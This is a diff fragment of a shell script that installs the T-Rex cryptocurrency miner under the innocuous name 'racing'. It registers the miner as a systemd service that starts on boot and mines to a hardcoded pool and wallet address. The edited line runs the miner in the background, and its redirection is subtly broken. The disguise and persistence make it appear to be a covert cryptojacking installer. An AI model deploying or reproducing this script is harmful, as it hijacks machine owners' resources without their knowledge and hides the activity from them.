@@ -21,4 +21,4 @@ mv t-rex racing
 sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o us-eth.2miners.com:2020 -u 1D4pzAA8bZPb2ZVkCZxS53C5qTRn9owcUB -p x -w ${woker}_lex\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
-./racing -a ethash -o us-eth.2miners.com:2020 -u 1D4pzAA8bZPb2ZVkCZxS53C5qTRn9owcUB -p x -w $woker > /dev/null
+./racing -a ethash -o us-eth.2miners.com:2020 -u 1D4pzAA8bZPb2ZVkCZxS53C5qTRn9owcUB -p x -w $woker & > /dev/null
